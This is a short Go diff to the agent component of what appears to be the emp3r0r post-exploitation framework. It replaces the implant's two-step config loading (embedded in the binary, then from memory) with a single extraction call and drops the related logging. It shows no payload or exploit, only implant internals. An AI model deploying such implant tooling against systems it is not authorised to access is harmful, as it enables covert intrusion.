@@ -3,7 +3,6 @@ package agent
 import (
 	"encoding/base64"
 	"fmt"
-	"log"
 
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
@@ -13,14 +12,9 @@ import (
 var RuntimeConfig = &emp3r0r_data.Config{}
 
 func ApplyRuntimeConfig() (err error) {
-	readJsonData, err := util.DigEmbeddedDataFromArg0()
+	readJsonData, err := util.ExtractData()
 	if err != nil {
-		e := err
-		log.Printf("read config from file: %v", err)
-		readJsonData, err = util.DigEmbededDataFromMem()
-		if err != nil {
-			return fmt.Errorf("read config from file: %v. from memory: %v", e, err)
-		}
+		return fmt.Errorf("read config: %v", err)
 	}
 
 	// base64 decode
